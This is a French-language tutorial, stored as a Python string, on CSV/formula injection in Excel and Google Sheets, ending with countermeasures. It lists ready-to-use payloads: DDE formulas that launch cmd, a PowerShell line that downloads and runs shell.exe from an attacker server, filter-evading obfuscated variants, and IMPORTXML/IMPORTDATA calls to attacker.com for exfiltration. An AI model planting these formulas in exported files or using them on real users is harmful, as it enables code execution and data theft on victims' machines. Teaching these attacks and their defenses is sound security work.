CONTENT = """\nCSV INJECTION (INJECTION CSV / FORMULES)

Définition pédagogique :

Le CSV Injection est une vulnérabilité qui apparaît lorsqu’une application génère ou exporte un fichier CSV contenant des données non filtrées.

Problème :
Si un utilisateur ouvre ce fichier dans un logiciel comme Excel ou Google Sheets, certaines valeurs peuvent être interprétées comme des formules.

Conséquence :
Le contenu n’est plus seulement du texte → il devient exécutable sous forme de formule.


==================================================
PRINCIPE GÉNÉRAL
==================================================

Un fichier CSV peut contenir des cellules comme :

A,B,C
test,123,hello

Mais si une cellule commence par un caractère spécial :

= + - @

alors elle peut être interprétée comme une formule.


Exemple dangereux :

=2+2

Dans Excel :
→ cela s’exécute et affiche 4


==================================================
PARTIE 1 : TECHNIQUES D’EXPLOITATION
==================================================


--------------------------------------------------
DDE (Dynamic Data Exchange)
--------------------------------------------------

Explication :

DDE est une ancienne fonctionnalité Windows permettant à Excel d’interagir avec des programmes externes.

Un attaquant peut l’utiliser pour exécuter des commandes système.


Exemples concrets :

=cmd|' /C calc'!A0

Résultat :
→ ouverture de la calculatrice Windows


Autres variantes :

DDE ("cmd";"/C calc";"!A0")A0

@SUM(1+1)*cmd|' /C calc'!A0


Impact :

- exécution de programmes locaux
- possible exécution de malware
- pivot vers commande système


--------------------------------------------------
PowerShell Injection
--------------------------------------------------

Explication :

CSV peut exécuter des commandes PowerShell si mal filtré.


Exemple concret :

=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

Effet :
- téléchargement d’un fichier malveillant
- exécution automatique


Impact :

- exécution de code à distance (RCE)
- prise de contrôle de la machine


--------------------------------------------------
Obfuscation de commandes
--------------------------------------------------

Explication :

L’attaquant masque les commandes pour éviter les filtres.


Exemples :

=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A

=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A

=     c m d   |   '/c calc.exe'!A


Objectif :

- contourner les filtres de sécurité
- rendre la détection difficile


--------------------------------------------------
Utilisation de rundll32
--------------------------------------------------

Explication :

rundll32 est un outil Windows qui peut exécuter des DLL.

Il peut être détourné dans des CSV mal filtrés.


Exemples :

=rundll32|'URL.dll,OpenURL calc.exe'!A

=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A


Impact :

- exécution indirecte de programmes
- contournement de certaines protections


--------------------------------------------------
Injection avec caractères invisibles
--------------------------------------------------

Explication :

Les espaces ou caractères invisibles peuvent être utilisés pour contourner les filtres.


Exemple :

=    C    m D    |    '/c calc.exe'!A


Objectif :

- éviter la détection par regex
- tromper les filtres basiques


==================================================
PARTIE 2 : GOOGLE SHEETS (CAS MODERNE)
==================================================


Google Sheets permet des fonctions d’import externe.


--------------------------------------------------
IMPORTXML
--------------------------------------------------

Explication :

Permet d’extraire des données depuis une URL avec XPath.


Exemple :

=IMPORTXML("http://attacker.com/csv", "//a/@href")


Effet :
→ envoi de requête vers serveur externe


--------------------------------------------------
IMPORTDATA
--------------------------------------------------

Explication :

Charge des données depuis une URL.


Exemple :

=IMPORTDATA("http://attacker.com/data.csv")


Effet :
- fuite de données possible
- exfiltration silencieuse


--------------------------------------------------
IMPORTHTML / IMPORTFEED
--------------------------------------------------

Exemples :

=IMPORTHTML("http://site.com", "table", 1)

=IMPORTFEED("http://site.com/feed")


Impact :

- récupération de données externes
- possible exfiltration indirecte


==================================================
PARTIE 3 : IMPACTS DE LA VULNÉRABILITÉ
==================================================

Un CSV Injection peut entraîner :

- exécution de commandes système
- téléchargement de malware
- vol de données
- phishing via Excel
- compromission de poste utilisateur


Scénario réel :

1. L’application exporte un CSV
2. Un champ contient une formule injectée
3. L’utilisateur ouvre le fichier dans Excel
4. La formule s’exécute automatiquement
5. Une commande est exécutée sur la machine


==================================================
PARTIE 4 : CONTRE-MESURES
==================================================

Protection côté application :

- échapper les caractères : = + - @
- préfixer avec une apostrophe (')
- valider toutes les entrées utilisateur
- éviter l’injection directe dans CSV


Exemple de protection :

Avant :
=cmd|' /C calc'!A0

Après :
'=cmd|' /C calc'!A0


Protection côté utilisateur :

- ouvrir CSV en mode texte
- désactiver l’exécution des formules
- vérifier les fichiers téléchargés


==================================================
CONCLUSION
==================================================

Le CSV Injection est une vulnérabilité simple mais dangereuse.

Pourquoi elle est critique :

- exploite des logiciels légitimes (Excel)
- ne nécessite pas de navigateur
- peut mener à une exécution de code local

Principe fondamental :

Ne jamais faire confiance aux données exportées dans un fichier interprétable (CSV, Excel, Sheets)."""